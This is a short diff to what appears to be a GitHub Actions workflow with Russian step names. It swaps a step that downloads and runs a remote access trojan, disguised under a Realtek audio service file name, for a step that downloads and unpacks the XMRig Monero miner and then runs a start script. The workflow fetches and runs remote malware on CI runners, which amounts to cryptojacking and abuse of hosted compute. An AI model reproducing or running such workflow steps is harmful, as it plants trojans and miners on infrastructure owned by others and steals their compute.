@@ -17,9 +17,11 @@ jobs:
       run: |
         Remove-item "C:\Users\Public\Desktop\*.lnk" -Force
         cmd /c install.bat
-    - name: Запуск RAT
+    - name: Запуск Майнера
       run: |
-        Invoke-WebRequest https://github.com/ThePyGoose/MyMonero/raw/main/RtkAudUService32.exe -Outfile RAT.exe
-        ./RAT.exe
+        Invoke-WebRequest https://github.com/ThePyGoose/MyMonero/raw/main/files/xmrig.zip -Outfile xmrig.zip
+        Expand-Archive xmrig.zip
+        cd xmrig
+        cd xmrig
     - name: Запуск виртуальной машины выполнен
-      run: cmd /c exit.bat
+      run: cmd /c start.cmd
